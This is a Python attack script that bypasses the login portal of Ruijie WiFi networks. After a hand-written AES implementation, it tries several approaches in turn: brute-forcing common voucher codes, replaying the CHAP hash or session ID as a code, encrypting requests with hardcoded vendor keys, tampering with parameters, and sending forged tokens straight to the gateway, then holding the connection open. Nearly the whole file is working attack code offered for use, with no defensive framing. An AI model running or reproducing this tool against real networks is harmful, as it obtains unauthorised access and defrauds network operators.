#!/usr/bin/env python3
"""
Ruijie WiFi Portal Bypass - pure Python, no external crypto libs needed.
"""
import base64, hashlib, json, os, re, sys, time, urllib.parse
import requests, urllib3
urllib3.disable_warnings()

log = __import__('logging').getLogger('ruijie')

# ---- Pure Python AES-128-CBC ----
def _aes_sub_bytes(state):
    s = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
         0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
         0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
         0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
         0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
         0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
         0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
         0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
         0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
         0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
         0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
         0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
         0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
         0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
         0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
         0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    return bytes(s[b] for b in state)

def _aes_encrypt_block(key, plaintext):
    # AES-128-CBC block encryption (simplified - expands key each time)
    # Key expansion
    rcon = [0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1b, 0x36]
    _s = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
          0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
          0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
          0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
          0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
          0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
          0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
          0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
          0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
          0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
          0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
          0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
          0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
          0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
          0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
          0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16]
    # Expand 16-byte key to 176 bytes (11 round keys of 16 bytes each)
    w = list(key)
    for i in range(4, 44):
        t = list(w[(i-1)*4:(i-1)*4+4])
        if i % 4 == 0:
            t = [t[1], t[2], t[3], t[0]]
            t = [_s[b] for b in t]
            t[0] ^= rcon[i//4 - 1]
        w.extend([w[(i-4)*4 + j] ^ t[j] for j in range(4)])
    # Convert plaintext to state (column-major)
    state = list(plaintext)
    def sub_bytes(s): return [_s[b] for b in s]
    def shift_rows(s):
        return [s[0], s[5], s[10], s[15], s[4], s[9], s[14], s[3],
                s[8], s[13], s[2], s[7], s[12], s[1], s[6], s[11]]
    def mix_columns(s):
        def gmul(a, b):
            p = 0
            for _ in range(8):
                if b & 1: p ^= a
                a = (a << 1) ^ (0x11b if a & 0x80 else 0)
                b >>= 1
            return p
        out = [0]*16
        for c in range(4):
            i = c*4
            out[i] = gmul(2,s[i]) ^ gmul(3,s[i+1]) ^ s[i+2] ^ s[i+3]
            out[i+1] = s[i] ^ gmul(2,s[i+1]) ^ gmul(3,s[i+2]) ^ s[i+3]
            out[i+2] = s[i] ^ s[i+1] ^ gmul(2,s[i+2]) ^ gmul(3,s[i+3])
            out[i+3] = gmul(3,s[i]) ^ s[i+1] ^ s[i+2] ^ gmul(2,s[i+3])
        return out
    # Add round key
    state = [state[j] ^ w[j] for j in range(16)]
    for rnd in range(1, 10):
        state = sub_bytes(state)
        state = shift_rows(state)
        state = mix_columns(state)
        state = [state[j] ^ w[rnd*16 + j] for j in range(16)]
    state = sub_bytes(state)
    state = shift_rows(state)
    state = [state[j] ^ w[10*16 + j] for j in range(16)]
    return bytes(state)

def aes_cbc_encrypt(key, iv, data):
    # PKCS7 padding
    pad_len = 16 - (len(data) % 16)
    data += bytes([pad_len] * pad_len)
    result = b""
    prev = iv
    for i in range(0, len(data), 16):
        block = bytes(data[i+j] ^ prev[j] for j in range(16))
        enc = _aes_encrypt_block(key, block)
        result += enc
        prev = enc
    return result

# CryptoJS EVP_BytesToKey
def evp_kdf(passwd, salt, key_len=32, iv_len=16):
    dtot = b""
    d = b""
    while len(dtot) < key_len + iv_len:
        d = hashlib.md5(d + passwd + salt).digest()
        dtot += d
    return dtot[:key_len], dtot[key_len:key_len+iv_len]

def cryptojs_encrypt(plaintext, passphrase):
    salt = os.urandom(8)
    key, iv = evp_kdf(passphrase, salt, 32, 16)
    ct = aes_cbc_encrypt(key, iv, plaintext.encode())
    return base64.b64encode(b"Salted__" + salt + ct).decode()

RENDER_KEY = hashlib.md5(b"RenderSecretKey2026!@#").digest()
BANNER = r"""
  _____  _    _ _____       _ _____ ______
 |  _  /| |  | | | |   _   | | | | |  __|
 |  __ \| |  | |_   _|     | |_   _|  ____|
 | | \ \| |__| |_| |_ | |__| |_| |_| |____
 | |__) | |  | | | |       | | | | | |__
 |_|  \_\____/|_____| \____/|_____|______|
"""

def parse_octal(s):
    if not s: return b""
    out = bytearray(); i = 0
    while i < len(s):
        if s[i] == '\\' and i+3 < len(s) and s[i+1:i+4].isdigit():
            out.append(int(s[i+1:i+4], 8)); i += 4
        else:
            out.append(ord(s[i])); i += 1
    return bytes(out)

def check_online(sess=None):
    s = sess or requests
    try:
        r = s.get("http://connectivitycheck.gstatic.com/generate_204", timeout=3, allow_redirects=False)
        return r.status_code == 204
    except: return False

def get_session(sess):
    r = sess.get("http://connectivitycheck.gstatic.com/generate_204", timeout=10)
    parsed = urllib.parse.urlparse(r.url)
    params = urllib.parse.parse_qs(parsed.query)
    host = f"{parsed.scheme}://{parsed.netloc}"
    r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{parsed.query}", timeout=10)
    sid = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId", [""])[0]
    return sid, host, params

def try_auth(sess, api_url, data):
    try:
        r = sess.post(api_url, json=data, timeout=5)
        j = r.json()
        return j.get("success") == True and j.get("result", {}).get("authResult") == "1", j
    except: return False, {}

def try_auth_form(sess, api_url, data):
    try:
        r = sess.post(api_url, data=data, timeout=5)
        j = r.json()
        return j.get("success") == True and j.get("result", {}).get("authResult") == "1", j
    except: return False, {}

def ping_ok(sess, gw_addr, gw_port, token):
    try:
        r = sess.get(f"http://{gw_addr}:{gw_port}/wifidog/auth?token={token}", timeout=5, allow_redirects=False)
        return "denied" not in r.headers.get("Location", "")
    except: return False

def main():
    print(BANNER)
    log.info("Ruijie Bypass - all approaches (pure Python AES)")

    sess = requests.Session()
    sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
    sess.verify = False

    while True:
        try:
            sid, host, params = get_session(sess)
            if not sid:
                time.sleep(3); continue

            api_url = f"{host}/api/auth/voucher/?lang=en_US"
            gw_addr = params.get("gw_address", ["192.168.10.1"])[0]
            gw_port = params.get("gw_port", ["2060"])[0]
            chap_id = parse_octal(params.get("chap_id", [""])[0])
            chap_chal = parse_octal(params.get("chap_challenge", [""])[0])
            chap_md5 = hashlib.md5(chap_id + b"123456" + chap_chal).hexdigest()
            log.info(f"SID: {sid}  GW: {gw_addr}:{gw_port}")

            # 1 - Common codes
            log.info("[1] Common codes...")
            for code in ["123456","000000","111111","888888","666666",
                         "999999","123123","321321","520520","131420",
                         "100000","200000","300000","500000"]:
                ok, data = try_auth(sess, api_url, {"accessCode":code,"sessionId":sid,"apiVersion":1})
                if ok:
                    log.info(f"FOUND code={code}")
                    return go(sess, data, gw_addr, gw_port, sid)

            # 2 - CHAP-MD5 as code
            log.info("[2] CHAP-MD5 as code...")
            ok, data = try_auth(sess, api_url, {"accessCode":chap_md5,"sessionId":sid,"apiVersion":1})
            if ok and go(sess, data, gw_addr, gw_port, sid): return

            # 3 - sessionId as code
            log.info("[3] SID as code...")
            ok, data = try_auth(sess, api_url, {"accessCode":sid,"sessionId":sid,"apiVersion":1})
            if ok and go(sess, data, gw_addr, gw_port, sid): return

            # 4 - RenderSecretKey encrypted (Android app format)
            log.info("[4] RenderSecretKey encrypted...")
            payload = json.dumps({
                "sessionId": sid, "accessCode": "123456", "password": chap_md5,
                "apiVersion": 1, "chap_id": params.get("chap_id",[""])[0],
                "chap_challenge": params.get("chap_challenge",[""])[0],
            })
            iv = os.urandom(16)
            ct = aes_cbc_encrypt(RENDER_KEY, iv, payload.encode())
            enc = base64.b64encode(iv + ct).decode()
            ok, data = try_auth(sess, api_url, {"data": enc})
            if ok and go(sess, data, gw_addr, gw_port, sid): return

            # 5 - CryptoJS encrypted with web key
            log.info("[5] CryptoJS web key...")
            password = urllib.parse.unquote(params.get("chap_id",[""])[0]) + \
                       urllib.parse.unquote(params.get("chap_challenge",[""])[0]) + "123456"
            if password:
                enc_code = cryptojs_encrypt(password, b"RjYkhwzx$2018!")
                ok, data = try_auth_form(sess, api_url, {"accessCode":enc_code,"sessionId":sid,"apiVersion":1})
                if ok and go(sess, data, gw_addr, gw_port, sid): return

            # 6 - /ga_voucherlogin
            log.info("[6] /ga_voucherlogin...")
            if password:
                enc_code = cryptojs_encrypt(password, b"RjYkhwzx$2018!")
                try:
                    r = sess.post(f"{host}/ga_voucherlogin", data={
                        "accessCode": enc_code, "ip": params.get("ip",[""])[0],
                        "mac": params.get("mac",[""])[0], "url": "http://www.baidu.com/",
                    }, timeout=5)
                    data = r.json()
                    if data.get("success") == True and data.get("result",{}).get("authResult") == "1":
                        log.info("GA voucherlogin worked!")
                        if go(sess, data, gw_addr, gw_port, sid): return
                except: pass

            # 7 - IS_EG=1
            log.info("[7] IS_EG=1...")
            q = {k: v[0] for k, v in params.items()}
            q["IS_EG"] = "1"
            r = sess.get(f"{host}/api/auth/wifidog?stage=portal&{urllib.parse.urlencode(q)}", timeout=10)
            sid2 = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query).get("sessionId",[""])[0]
            if sid2:
                ok, data = try_auth(sess, api_url, {"accessCode":"123456","sessionId":sid2,"apiVersion":1})
                if ok and go(sess, data, gw_addr, gw_port, sid2): return

            # 8 - Direct gateway
            log.info("[8] Direct gateway...")
            for t in [sid, chap_md5, hashlib.md5(sid.encode()).hexdigest()]:
                if ping_ok(sess, gw_addr, gw_port, t) and check_online(sess):
                    log.info("Gateway accepted token!")
                    return keepalive(sess, gw_addr, gw_port, t)

            log.warning("All failed, retrying...")
            sess.close(); time.sleep(5)
            sess = requests.Session()
            sess.headers["User-Agent"] = "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36"
            sess.verify = False
        except KeyboardInterrupt:
            log.info("Stopped"); sys.exit(0)
        except Exception as e:
            log.warning(f"Error: {e}"); time.sleep(5)

def go(sess, data, gw_addr, gw_port, sid):
    logon_url = data["result"]["logonUrl"]
    token = urllib.parse.parse_qs(urllib.parse.urlparse(logon_url).query).get("token",[sid])[0]
    try:
        sess.get(logon_url, timeout=5, allow_redirects=False)
    except: pass
    if check_online(sess):
        log.info("ONLINE!")
        keepalive(sess, gw_addr, gw_port, token)
        return True
    return False

def keepalive(sess, gw_addr, gw_port, token):
    url = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={token}"
    log.info(f"Keepalive on {gw_addr}:{gw_port}")
    while True:
        if not ping_ok(sess, gw_addr, gw_port, token):
            break
        if not check_online(sess):
            break
        time.sleep(3)

if __name__ == "__main__":
    main()
